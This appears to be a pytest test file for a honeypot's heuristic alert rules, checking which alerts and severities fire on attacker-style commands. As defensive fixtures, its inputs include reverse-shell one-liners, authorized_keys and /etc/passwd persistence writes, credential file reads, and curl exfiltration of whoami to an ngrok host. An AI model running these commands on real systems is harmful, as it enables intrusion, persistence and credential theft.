"""Unit tests for the 14 heuristic rules."""
import pytest

from .conftest import FakeLLM, actions, severity


# Helper: drive the orchestrator and return after each command.
async def run(orch, sess, cmd):
    return await orch.handle_command(sess, cmd)


class TestCriticalAlerts:
    async def test_alert_reverse_shell_bash_devtcp(self, orchestrator, session):
        await run(orchestrator, session, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert "alert_reverse_shell" in actions(session)
        assert severity(session, "alert_reverse_shell") == "critical"

    async def test_alert_reverse_shell_nc_e(self, orchestrator, session):
        await run(orchestrator, session, "nc -e /bin/sh 10.0.0.1 4444")
        assert "alert_reverse_shell" in actions(session)

    async def test_alert_reverse_shell_python_socket(self, orchestrator, session):
        await run(orchestrator, session, "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'")
        assert "alert_reverse_shell" in actions(session)

    async def test_alert_ssh_persistence(self, orchestrator, session):
        await run(orchestrator, session, 'echo "ssh-rsa ATTACKER" >> ~/.ssh/authorized_keys')
        assert "alert_ssh_persistence" in actions(session)
        assert severity(session, "alert_ssh_persistence") == "critical"

    async def test_alert_ssh_persistence_via_etc_passwd_write(self, orchestrator, session):
        await run(orchestrator, session, "echo evil:x:0:0::/root:/bin/bash > /etc/passwd")
        assert "alert_ssh_persistence" in actions(session)


class TestHighAlerts:
    async def test_alert_credential_exfil_aws_creds(self, orchestrator, session):
        await run(orchestrator, session, "cat ~/.aws/credentials")
        assert "alert_credential_exfil" in actions(session)
        assert severity(session, "alert_credential_exfil") == "high"

    async def test_alert_credential_exfil_ssh_key(self, orchestrator, session):
        await run(orchestrator, session, "cat ~/.ssh/id_rsa")
        assert "alert_credential_exfil" in actions(session)

    async def test_alert_credential_exfil_does_not_fire_on_bash_history(self, orchestrator, session):
        await run(orchestrator, session, "cat ~/.bash_history")
        assert "alert_credential_exfil" not in actions(session)
        assert session.observed["bash_history_inspected"] is True

    async def test_alert_dns_exfil_ngrok(self, orchestrator, session):
        await run(orchestrator, session, "curl https://x.ngrok.io/$(whoami)")
        assert "alert_dns_exfil" in actions(session)
        assert severity(session, "alert_dns_exfil") == "high"

    async def test_alert_dns_exfil_burpcollab(self, orchestrator, session):
        await run(orchestrator, session, "wget http://abc.burpcollaborator.net/test")
        assert "alert_dns_exfil" in actions(session)

    async def test_dns_exfil_does_not_fire_on_benign_curl(self, orchestrator, session):
        await run(orchestrator, session, "curl https://api.acme.corp/health")
        assert "alert_dns_exfil" not in actions(session)

    async def test_alert_lateral_decoy(self, orchestrator, session):
        await run(orchestrator, session, "ssh db-prod-01")
        assert "alert_lateral_decoy" in actions(session)
        assert severity(session, "alert_lateral_decoy") == "high"

    async def test_lateral_decoy_does_not_fire_on_github(self, orchestrator, session):
        await run(orchestrator, session, "ssh github.com")
        assert "alert_lateral_decoy" not in actions(session)

    async def test_alert_honeytoken_tamper_overwrite(self, orchestrator, session):
        await run(orchestrator, session, 'echo "STOLEN" > ~/.aws/credentials')
        assert "alert_honeytoken_tamper" in actions(session)
        assert severity(session, "alert_honeytoken_tamper") == "high"

    async def test_alert_honeytoken_tamper_delete(self, orchestrator, session):
        await run(orchestrator, session, "rm ~/.aws/credentials")
        assert "alert_honeytoken_tamper" in actions(session)

    async def test_alert_log_tampering_history_c(self, orchestrator, session):
        await run(orchestrator, session, "history -c")
        assert "alert_log_tampering" in actions(session)

    async def test_alert_log_tampering_truncate_bash_history(self, orchestrator, session):
        await run(orchestrator, session, "> ~/.bash_history")
        assert "alert_log_tampering" in actions(session)


class TestMediumAlerts:
    async def test_alert_credential_search_find(self, orchestrator, session):
        await run(orchestrator, session, "find / -name id_rsa")
        assert "alert_credential_search" in actions(session)
        assert severity(session, "alert_credential_search") == "medium"

    async def test_alert_credential_search_grep_akia(self, orchestrator, session):
        await run(orchestrator, session, "grep -r AKIA /home")
        assert "alert_credential_search" in actions(session)

    async def test_alert_payload_staging_threshold(self, orchestrator, session):
        await run(orchestrator, session, "touch /tmp/a")
        await run(orchestrator, session, "touch /tmp/b")
        assert "alert_payload_staging" not in actions(session)
        await run(orchestrator, session, "touch /tmp/c")
        assert "alert_payload_staging" in actions(session)
        assert severity(session, "alert_payload_staging") == "medium"

    async def test_alert_decoy_swallowed(self, orchestrator, session):
        # Sudo plants /etc/sudoers.d/zzz_compat, reading it = swallowed
        await run(orchestrator, session, "sudo -l")
        await run(orchestrator, session, "cat /etc/sudoers.d/zzz_compat")
        assert "alert_decoy_swallowed" in actions(session)


class TestInfoAlerts:
    async def test_plant_sudo_vulnerability_on_first_sudo(self, orchestrator, session):
        await run(orchestrator, session, "sudo -l")
        assert "plant_sudo_vulnerability" in actions(session)
        assert severity(session, "plant_sudo_vulnerability") == "info"

    async def test_spawn_fake_mysql_on_mysql_probe(self, orchestrator, session):
        await run(orchestrator, session, "mysql -u root -p")
        assert "spawn_fake_mysql" in actions(session)


class TestIdempotency:
    async def test_alert_fires_once_per_engagement(self, orchestrator, session):
        await run(orchestrator, session, "cat ~/.aws/credentials")
        await run(orchestrator, session, "cat ~/.aws/credentials")
        await run(orchestrator, session, "cat ~/.aws/credentials")
        count = sum(1 for a in actions(session) if a == "alert_credential_exfil")
        assert count == 1


class TestSeverityPriority:
    async def test_critical_fires_before_high(self, orchestrator, session):
        # SSH-persistence (critical) AND credential-exfil (high) both observed
        # in one command — both should fire (looped decide_action).
        await run(orchestrator, session, "cat ~/.aws/credentials")
        await run(orchestrator, session, "echo k >> ~/.ssh/authorized_keys")
        acts = actions(session)
        assert "alert_ssh_persistence" in acts
        assert "alert_credential_exfil" in acts
